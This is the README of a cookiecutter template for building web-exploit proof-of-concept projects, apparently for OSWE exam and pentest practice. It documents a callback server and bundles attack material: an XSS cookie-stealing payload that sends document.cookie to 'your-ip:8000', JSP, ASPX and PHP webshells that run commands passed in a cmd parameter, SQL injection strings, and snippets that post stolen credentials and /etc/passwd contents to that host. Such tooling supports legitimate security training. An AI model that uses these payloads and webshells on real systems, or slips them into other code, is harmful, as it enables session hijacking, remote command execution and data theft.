# {{ cookiecutter.project_name }}

**Target URL:** {{ cookiecutter.target_url }}

## Quick Start

```bash
# 1. Start callback server (terminal 1)
uv run {{ cookiecutter.project_slug }} --server

# 2. Run exploit (terminal 2)
uv run {{ cookiecutter.project_slug }} -t http://target.com
```

## Writing Your Exploit

Edit `src/{{ cookiecutter.project_slug }}/exploit.py`:

```python
from {{ cookiecutter.project_slug }}.utils.output import out

def run(args):
    target = args.target.rstrip('/')

    out.info("Testing target...")
    resp = requests.get(f"{target}/vulnerable-endpoint", verify=False)

    if "vulnerable" in resp.text:
        out.success("Target is vulnerable!")

        # Trigger callback to your server
        requests.get("http://your-ip:8000/success")
    else:
        out.error("Not vulnerable")
```

## Utilities Available

### Colored Output
```python
from {{ cookiecutter.project_slug }}.utils.output import out

out.success("Exploited!")
out.error("Failed")
out.info("Trying...")
out.warning("Slow connection")
```

### Encoding/Decoding
```python
from {{ cookiecutter.project_slug }}.utils.encoding import base64_encode, url_encode

payload = base64_encode("admin' OR '1'='1")
encoded = url_encode("<script>alert(1)</script>")
```

### Timing Utilities
```python
from {{ cookiecutter.project_slug }}.utils.timing import time_ms, identify_timestamp, epoch_range

# Generate timestamp
token = time_ms()

# Identify unknown timestamp
info = identify_timestamp("1735689600000")
print(info['type'])  # epoch_milliseconds
print(info['date'])  # 2025-01-01 00:00:00

# Generate epoch range - now accepts epoch timestamps directly!
timestamps = epoch_range(1735689600, 1735776000, step_minutes=60)  # Using epoch
timestamps = epoch_range('2025-01-01 00:00:00', '2025-01-02 00:00:00')  # Using strings
```

### Process Execution
```python
from {{ cookiecutter.project_slug }}.utils.process import run

# Run binary
stdout, stderr, code = run("./exploit")

# With input
stdout, stderr, code = run("./vulnerable", input_data=payload)
```

## Server Usage

The built-in server (`servers/server.py`):
- **Serves payloads** from `payloads/` directory
- **Logs all requests** to `logs/server.ndjson`
- **CORS enabled** for XSS testing

### Start Server
```bash
# Via CLI (default port 8000)
uv run {{ cookiecutter.project_slug }} --server

# Custom port
uv run {{ cookiecutter.project_slug }} --server --lport 8080

# Bind to specific interface
uv run {{ cookiecutter.project_slug }} --server --lhost 10.10.14.5 --lport 8080

# Direct module execution
python -m {{ cookiecutter.project_slug }}.servers.server
```

### Check Logs
```bash
# Watch in real-time
tail -f logs/server.ndjson | jq .

# Search for specific callbacks
grep "xss" logs/server.ndjson | jq .
```

### Apache Fallback (OSWE Exam)

If exam requires Apache2, use `apache_hooks.py` instead of `server_hooks.py`:

```python
# Change this:
# from utils.server_hooks import get_cookie

# To this:
from utils.apache_hooks import get_cookie

# Same API, reads Apache logs instead
cookie = get_cookie('/var/log/apache2/access.log', timeout=30)
```

No server needed - just reads Apache access logs directly!

## Included Payloads

### XSS (`payloads/xss/`)
- `examples.txt` - Copy-paste XSS payloads
- `steal-cookie.js` - Cookie stealer
- `steal-all.js` - Full data exfiltration

Example:
```html
<img src=x onerror="fetch('http://your-ip:8000/xss?c='+btoa(document.cookie))">
```

### Webshells (`payloads/shells/`)
- `cmd.jsp` - Java servers
- `cmd.aspx` - .NET/IIS servers
- `cmd.php` - PHP servers

All shells use same interface:
```python
resp = requests.get("http://target/shell.jsp?cmd=whoami")
print(resp.text)
```

## Common Code Snippets

### HTTP Requests
```python
import requests
requests.packages.urllib3.disable_warnings()  # Disable SSL warnings

session = requests.Session()
session.verify = False  # Skip SSL verification
session.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
```

### Blind Exploitation Callbacks
```python
# SQLi boolean-based
if "admin" in result:
    requests.get(f"http://your-ip:8000/sqli?char={char}&pos={pos}")

# Time-based confirmation
import time
start = time.time()
make_request()
if time.time() - start > 5:
    requests.get(f"http://your-ip:8000/blind?confirmed=true")
```

### Data Exfiltration
```python
# POST JSON data
stolen_data = {"username": "admin", "password": "found_it"}
requests.post('http://your-ip:8000/exfil', json=stolen_data)

# POST file contents
with open('/etc/passwd', 'r') as f:
    requests.post('http://your-ip:8000/file', data=f.read())
```

## CLI Options

```bash
{{ cookiecutter.project_slug }} --help

Options:
  -t, --target URL     Target URL (default: {{ cookiecutter.target_url }})
  -p, --proxy URL      HTTP proxy for requests
  --threads N          Number of threads
  -v, --verbose        Verbose output
  --server             Start callback server
  --lhost IP           Local host for server/callbacks (auto-detected)
  --lport N            Local port for server/callbacks (default: 8000)
```

## Files

- `src/{{ cookiecutter.project_slug }}/exploit.py` - **Main exploit code** (edit this!)
- `src/{{ cookiecutter.project_slug }}/utils/` - Helper utilities
- `servers/server.py` - HTTP callback server
- `payloads/` - XSS payloads and webshells
- `logs/server.ndjson` - Server request logs

---

Template: [cookiecutter-poc](https://github.com/kwkeefer/cookiecutter-poc)